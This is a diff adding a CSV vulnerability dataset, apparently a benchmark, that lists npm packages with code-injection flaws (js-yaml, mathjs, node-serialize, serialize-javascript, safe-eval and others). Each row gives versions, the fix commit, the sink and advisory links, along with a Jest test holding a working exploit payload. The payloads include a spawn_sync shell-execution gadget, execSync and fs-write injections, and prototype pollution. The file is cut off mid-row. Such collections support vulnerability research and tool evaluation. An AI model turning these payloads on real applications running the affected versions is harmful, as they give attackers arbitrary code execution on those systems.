@@ -1,0 +1,752 @@
+Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
+code-injection,,js-yaml,3.13.0,3.13.1,code-injection/js-yaml_3.13.0,"test(""Arbitrary code execution in js-yaml"", () => {
+  expect.assertions(2);
+  const payload =
+    ""{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1"";
+  const jsyaml = require(""js-yaml"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    jsyaml.load(payload);
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/nodeca/js-yaml/pull/480/commits/e18afbf1edcafb7add2c4c7b22abc8d6ebc2fa61,lib/js-yaml/type/js/function.js:70:12,https://security.snyk.io/vuln/SNYK-JS-JSYAML-174129; https://github.com/advisories/GHSA-xxvw-45rp-3mj2
+code-injection,,mathjs,3.9.0,3.11.5,code-injection/mathjs_3.9.0,"test(""Arbitrary code execution in mathjs"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const math = require(""mathjs"");
+  const path = ""./mathjs"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    math.eval(
+      '[].map.constructor(""spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));"")()'
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/josdejong/mathjs/compare/v3.10.3...v3.11.5,,https://security.snyk.io/vuln/npm:mathjs:20170402; https://github.com/advisories/GHSA-pv8x-p9hq-j328
+code-injection,,@zhaoyao91/eval-in-vm,0.0.0,n/a,code-injection/zhaoyao91-eval-in-vm_0.0.0,"test(""Arbitrary code execution in @zhaoyao91/eval-in-vm"", () => {
+  expect.assertions(2);
+  const eval1 = require(""@zhaoyao91/eval-in-vm"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    (""use strict"");
+    const result = eval1(""1 + (this.constructor.prototype.polluted = `yes`);"");
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,eval-in-vm/index.js:11:6,https://github.com/advisories/GHSA-jp99-5h8w-gmxc; 
+code-injection,CVE-2020-7640,pixl-class,1.0.0,1.0.3,code-injection/pixl-class_1.0.0,"test(""Arbitrary code execution in pixl-class"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const a = require(""pixl-class"");
+  const path = ""./pixl-class"";
+  try {
+    if (fs.existsSync(path)) fs.unlinkSync(path);
+    console.log(""File removed:"", path);
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var members = {
+    __parent:
+      'function(){}; require(""fs"").writeFileSync(""./pixl-class"",""""); //}',
+  };
+  try {
+    a.create(members);
+  } catch (e) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/jhuckaby/pixl-class/commit/47677a3638e3583e42f3a05cc7f0b30293d2acc8,class.js:26:4,https://security.snyk.io/vuln/SNYK-JS-PIXLCLASS-564968; https://github.com/advisories/GHSA-vm5j-vqr6-v7v8
+code-injection,CVE-2020-15362,wifiscanner,1.0.1,n/a,code-injection/wifiscanner_1.0.1,"test(""Arbitrary code execution in wifiscanner"", () => {
+  expect.assertions(1);
+  const fs = require(""fs"");
+  let wifiscanner = require(""wifiscanner"");
+  const sleep = require(""sleep"");
+  const path = ""./wifiscanner.txt"";
+  let options = {
+    args: ""./wifiscanner.txt"",
+    binaryPath: ""touch"",
+  };
+  try {
+    let scanner = wifiscanner(options);
+    scanner.scan(function (error, networks) {});
+  } catch (error) {
+    console.log(error);
+  }
+  sleep.sleep(2);
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,scanners/wifiscanner.js:12:22,https://security.snyk.io/vuln/SNYK-JS-WIFISCANNER-574786; https://github.com/advisories/GHSA-m6rw-m2v9-7hx4
+code-injection,CVE-2017-5954,serialize-to-js,^0.5.0,1.0.0,code-injection/serialize-to-js_0.5.0,"test(""Arbitrary code execution in serialize-to-js"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const serialize = require(""serialize-to-js"");
+  const path = ""./serialize-to-js"";
+  let payload =
+    ""{e: (function(){ spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`serialize-to-js`]));})() }"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    serialize.deserialize(payload);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429,,https://security.snyk.io/vuln/npm:serialize-to-js:20170208; https://github.com/advisories/GHSA-mm62-wxc8-cf7m
+code-injection,,mol-proto,^0.1.3,1.0.6,code-injection/mol-proto_0.1.3,"test(""Arbitrary code execution in mol-proto"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const mp = require(""mol-proto"");
+  const path = ""./mol-proto"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    mp.makeFunction(
+      ""a"",
+      ""b"",
+      ""};require('fs').writeFileSync('./mol-proto', '');{""
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/milojs/proto/pull/2/commits/10adbec293e7dfdb2e9e565bfd77187cf0373cbe,lib/proto_function.js:70:5,https://security.snyk.io/vuln/npm:mol-proto:20160407; 
+code-injection,,m-log,0.0.1,n/a,code-injection/m-log_0.0.1,"test(""Arbitrary code execution in m-log"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const log = require(""m-log"");
+  const path = ""./m-log"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    log.setColorTheme({
+      silly: 'yellow""}); require(`fs`).writeFileSync(`m-log`,``); 23//',
+    });
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/m-prj/m-log/pull/1/commits/ee1a08f25555201001dee497addeae9d1705226a,libs/log.js:24:11,https://security.snyk.io/vuln/npm:m-log:20160408; 
+code-injection,CVE-2021-23594,realms-shim,1.1.0,n/a,code-injection/realms-shim_1.1.0,"test(""Arbitrary code execution in realms-shim"", () => {
+  expect.assertions(2);
+  let Realm = require(""realms-shim"");
+  const r = Realm.makeRootRealm();
+  expect({}.polluted).toBe(undefined);
+  try {
+    r.evaluate(`let HostException;
+          try{
+               (0, eval)('--'+'>');
+          }catch(e){
+               HostException = e;
+          }
+          const HostObject = HostException.__proto__.__proto__.__proto__;
+          HostObject.polluted = 'yes';
+          `);
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/evaluators.js:60:26,https://security.snyk.io/vuln/SNYK-JS-REALMSSHIM-2309907; https://github.com/advisories/GHSA-7cg8-pq9v-x98q
+code-injection,,marsdb,0.6.11,n/a,code-injection/marsdb_0.6.11,"test(""Arbitrary code execution in marsdb"", () => {
+  expect.assertions(2);
+  let Collection = require(""marsdb"").Collection;
+  expect({}.polluted).toBe(undefined);
+  const posts = new Collection(""posts"", { inMemory: true });
+  // try {
+  //     let val = posts.insert({ text: 'MarsDB is awesome' });
+  //     return val.then(docId => {
+  //         let out = posts.find({ $where: '(Object.prototype.polluted=`yes`)' });
+  //         out.then(docs => {
+  //             expect({}.polluted).toBe('yes');
+  //         });
+  //     });
+  // } catch (e) {
+  // }
+
+  return posts.insert({ text: ""MarsDB is awesome"" }).then((docId) => {
+    return posts
+      .find({ $where: ""(Object.prototype.polluted=`yes`)"" })
+      .then((docs) => {
+        expect({}.polluted).toBe(""yes"");
+      });
+  });
+});
+",n/a,dist/DocumentMatcher.js:419:23,https://security.snyk.io/vuln/SNYK-JS-MARSDB-480405; https://github.com/advisories/GHSA-5mrr-rgp6-x4gr
+code-injection,CVE-2020-28464,djv,2.0.0,2.1.4,code-injection/djv_2.0.0,"test(""Arbitrary code execution in  djv"", () => {
+  expect.assertions(2);
+  const djv = require(""djv"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    const env = new djv();
+    const evilSchema = JSON.parse(
+      '{""common"":{""type"":""array"", ""minItems"":""1 + (Object.prototype.polluted = `yes`)""}}'
+    );
+    env.addSchema(""test"", evilSchema);
+    env.validate(""test#/common"", { type: ""custom"" });
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/utils/template.js:110:15,https://github.com/advisories/GHSA-4hv7-3q38-97m8; https://security.snyk.io/vuln/SNYK-JS-DJV-1014545
+code-injection,CVE-2020-7766,json-ptr,2.0.0,2.0.0,code-injection/json-ptr_2.0.0,"test(""Arbitrary code execution in json-ptr"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const jptr = require(""json-ptr"");
+  const path = ""./json-ptr"";
+  file_exist = fs.existsSync(path);
+  expect({}.polluted).toBe(undefined);  
+  JsonPointer = jptr.JsonPointer;
+  try {
+    let customSpawn = 'spawn_sync = process.binding(`spawn_sync`);normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};';
+    JsonPointer.get(
+      {},      
+      `/aaa'])) !== 'undefined') {return it;}; ${customSpawn}; spawnSync(""touch"",[""json-ptr""]); if(((['a`
+    );
+  } catch (error) {
+    console.log(""err===>"", error);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,src/util.ts:155:10,https://github.com/advisories/GHSA-x5r6-x823-9848; https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1016939
+code-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,code-injection/hot-formula-parser_3.0.0,"test(""Arbitrary code execution in hot-formula-parser"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const FormulaParser = require(""hot-formula-parser"").Parser;
+  const path = ""./hot-formula-parser"";
+  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    let parser = new FormulaParser();
+    parser.parse(
+      ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
+code-injection,,open,0.0.5,6.0.0,code-injection/open_0.0.5,"test(""Arbitrary code execution in open"", (done) => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const path = ""./open"";
+  try {
+    if (fs.existsSync(path)) fs.unlinkSync(path);
+    console.log(""File removed:"", path);
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    require(""open"")('""""`touch open`', () => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      if (file_exist) fs.unlinkSync(path);
+      done();
+    });
+  } catch (error) {}
+});
+",,lib/open.js:58:10,https://security.snyk.io/vuln/SNYK-JS-OPEN-174041; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
+code-injection,CVE-2020-7660,serialize-javascript,2.0.0,3.1.0,code-injection/serialize-javascript_2.0.0,"test(""Arbitrary code execution in serialize-javascript"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const serialize = require(""serialize-javascript"");
+  const path = ""./serialize-javascript"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  eval(
+    ""("" +
+      serialize({
+        str:
+          ""string"" +
+          this.constructor
+            .constructor(`return process`)()
+            .mainModule.require(`fs`)
+            .writeFileSync(`serialize-javascript`, ``),
+      }) +
+      "")""
+  );
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/yahoo/serialize-javascript/commit/f21a6fb3ace2353413761e79717b2d210ba6ccbd,,https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062; https://github.com/advisories/GHSA-hxcc-f52p-wc94
+code-injection,,is-my-json-valid,2.20.0,2.20.3,code-injection/is-my-json-valid_2.20.0,"test(""Arbitrary code execution in is-my-json-valid"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const validator = require(""is-my-json-valid"");
+  const path = ""./is-my-json-valid"";
+  const sleep = require(""sleep"");
+  file_exist = fs.existsSync(path);
+  expect({}.polluted).toBe(undefined);
+  const schema = {
+    type: ""object"",
+    properties: {
+      ""x[1 + (Object.prototype.polluted='yes')]"": {
+        required: true,
+        type: ""string"",
+      },
+    },
+  };
+  try {
+    let validate = validator(schema);
+    validate({});
+  } catch (e) {}
+  file_exist = fs.existsSync(path);
+  expect({}.polluted).toBe(""yes"");
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/mafintosh/is-my-json-valid/commit/3419563687df463b4ca709a2b46be8e15d6a2b3d,index.js:172:21,https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597167; https://github.com/advisories/GHSA-f522-ffg8-j8r6
+code-injection, CVE-2020-7710,safe-eval,0.2.0,n/a,code-injection/safe-eval_0.2.0,"test(""Arbitrary code execution in safe-eval"", () => {
+  expect.assertions(2);
+  var safeEval = require(""safe-eval"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    safeEval(""this.constructor.prototype.polluted=`yes`"");
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:13:6,https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-608076; https://github.com/advisories/GHSA-hrpq-r399-whgw
+code-injection,,static-eval,1.1.1,2.0.2,code-injection/static-eval_1.1.1,"test(""Arbitrary code execution in static-eval"", () => {
+  expect.assertions(2);
+  const evaluate = require(""static-eval"");
+  const parse = require(""esprima"").parse;
+  expect({}.polluted).toBe(undefined);
+  let src = ""(function(){1 + (Object.prototype.polluted = `yes`)}())"";
+  try {
+    let ast = parse(src).body[0].expression;
+    let res = evaluate(ast, {});
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/browserify/static-eval/commit/32f8efd072625e267aa7237d2daff35738c50d2a,index.js:118:20,https://security.snyk.io/vuln/SNYK-JS-STATICEVAL-173693; https://github.com/advisories/GHSA-8v27-2fg9-7h62
+code-injection,,mongoosemask,0.0.6,n/a,code-injection/mongoosemask_0.0.6,"test(""Arbitrary code execution in mongoosemask"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const mask = require(""mongoosemask"");
+  const path = ""./mongoosemask"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    mask.mask({}, [
+      'id""]; require(`fs`)[""writeFileSync""](`mongoosemask`,``)//',
+    ]);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,index.js:181:5,https://security.snyk.io/vuln/npm:mongoosemask:20160408; 
+code-injection,CVE-2017-5941,node-serialize,0.0.3,n/a,code-injection/node-serialize_0.0.3,"test(""Arbitrary code execution in node-serialize"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const serialize = require(""node-serialize"");
+  const path = ""./node-serialize"";
+  let payload =
+    '{""rce"":""_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()""}';
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    serialize.unserialize(payload);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/serialize.js:75:22,https://security.snyk.io/vuln/npm:node-serialize:20170208; https://github.com/advisories/GHSA-q4v7-4rhw-9hqm
+code-injection,,veval,1.0.0,n/a,code-injection/veval_1.0.0,"test(""Arbitrary code execution in veval"", () => {
+  expect.assertions(2);
+  const ve = require(""veval"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    ve({ hi: 0 }, ""1 + (this.constructor.prototype.polluted = `yes`);"");
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:13:21,https://github.com/advisories/GHSA-54qm-37qr-w5wq; 
+code-injection,,mathjs,3.10.3,3.11.5,code-injection/mathjs_3.10.3,"test(""Arbitrary code execution in mathjs"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const math = require(""mathjs"");
+  const path = ""./mathjs"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    math.eval(
+      'import({matrix:cos.constructor},{override:1});x=[""spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));""];x()'
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/josdejong/mathjs/compare/v3.10.3...v3.11.5,,https://security.snyk.io/vuln/npm:mathjs:20170402; https://github.com/advisories/GHSA-pv8x-p9hq-j328
+code-injection,CVE-2020-7674,access-policy,3.1.0,n/a,code-injection/access-policy_3.1.0,"test(""Arbitrary code execution in access-policy"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  let a = require(""access-policy"");
+  const path = ""./access-policy"";
+  let statements = ""`; require(`fs`).writeFileSync(`"" + path + ""`,``);//"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    a.encode(statements, data);
+  } catch (e) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/encode.js:6:10,https://security.snyk.io/vuln/SNYK-JS-ACCESSPOLICY-571490; https://github.com/advisories/GHSA-fw2f-7f87-5r6c
+code-injection,CVE-2020-7673,node-extend,^0.2.0,n/a,code-injection/node-extend_0.2.0,"test(""Arbitrary code execution in node-extend"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const extend = require(""node-extend"");
+  const path = ""./node-extend"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    foo = extend(
+      ""function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}"",
+      """"
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/extend.js:31:11,https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-571491; https://github.com/advisories/GHSA-cg42-4wrc-gp47
+code-injection,CVE-2016-10548,reduce-css-calc,1.2.0,1.2.5,code-injection/reduce-css-calc_1.2.0,"test(""Arbitrary code execution in reduce-css-calc"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const reduceCSSCalc = require(""reduce-css-calc"");
+  const path = ""./reduce-css-calc"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
+    console.log(
+      reduceCSSCalc(
+        `calc(                       (global['fs'] = require('fs')))`
+      )
+    );
+    console.log(
+      reduceCSSCalc(
+        `calc(                       (fs['writeFileSync'](""reduce-css-calc"", """")))`
+      )
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,index.js:73:16,https://security.snyk.io/vuln/npm:reduce-css-calc:20160913; https://github.com/advisories/GHSA-4662-j96g-mv46
+code-injection,,value-censorship,1.1.0,n/a,code-injection/value-censorship_1.1.0,"test(""Arbitrary code execution in  value-censorship"", () => {
+  expect.assertions(2);
+  const censor = require(""value-censorship"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    censor(`
+        ;1 +(Object.prototype.polluted = 'yes')//
+        `);
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:22:19,https://github.com/advisories/GHSA-xrr6-6ww3-f3qm; 
+code-injection,CVE-2020-7672,mosc,1.0.0,n/a,code-injection/mosc_1.0.0,"test(""Arbitrary code execution in mosc"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  var A = require(""mosc"");
+  expect({}.polluted).toBe(undefined);
+  let a = new A({});
+  let key = """";
+  let attack_code = ""1 + (Object.prototype.polluted = `yes`)"";
+  let properties = ""{a:*1*; "" + attack_code + "" //*}"";
+  let base = """";
+  try {
+    a.parse_properties(key, properties, {}, {});
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,mosc.js:50:43,https://security.snyk.io/vuln/SNYK-JS-MOSC-571492; https://github.com/advisories/GHSA-j665-rvj7-2jv9
+code-injection,,mixin-pro,0.6.0,0.6.7,code-injection/mixin-pro_0.6.0,"test(""Arbitrary code execution in mixin-pro"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const Class = require(""mixin-pro"").createClass;
+  const path = ""./mixin-pro"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {      
+      function Foo() { }
+      Object.defineProperty(Foo, ""name"", {
+        enumerable: false,
+        configurable: false,
+        writable: true,
+        value: 'static'
+      });
+      Foo.name = ""test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor""
+      let Bar1 = Class(Foo, { constructor: Foo });
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/floatinghotpot/mixin-pro/commit/8bb355209f0a082d24b04355b3e8051a6455454f,,https://security.snyk.io/vuln/npm:mixin-pro:20160407; 
+code-injection,CVE-2020-7677,thenify,3.3.0,3.3.1,code-injection/thenify_3.3.0,"test(""Arbitrary code execution in thenify"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const a = require(""thenify"");
+  const path = ""./thenify"";
+  let payload = ""fs=require('fs');fs.writeFileSync('thenify','',)"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    function cur() {}
+    Object.defineProperty(cur, ""name"", {
+      value: ""fake() {"" + payload + "";})();(function(){//"",
+    });
+    a(cur);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/thenables/thenify/commit/0d94a24eb933bc835d568f3009f4d269c4c4c17a,index.js:17:10,https://security.snyk.io/vuln/SNYK-JS-THENIFY-571690; 
+code-injection,CVE-2020-7609,node-rules,3.0.0,5.0.0,code-injection/node-rules_3.0.0,"test(""Arbitrary code execution in node-rules"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const A = require(""node-rules"");
+  const path = ""./node-rules"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    var rules = {
+      condition: ""{}.__proto__.toString = 222"",
+      consequence: ""require(`fs`).writeFileSync(`node-rules`,``)"",
+    };
+    var a = new A();
+    a.fromJSON(rules);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/node-rules.js:245:33,https://security.snyk.io/vuln/SNYK-JS-NODERULES-560426; https://github.com/advisories/GHSA-f78f-353m-cf4j
+code-injection,CVE-2020-7777,jsen,0.6.6,n/a,code-injection/jsen_0.6.6,"test(""Arbitrary code execution in jsen"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const jsen = require(""jsen"");
+  const path = ""./jsen"";
+  
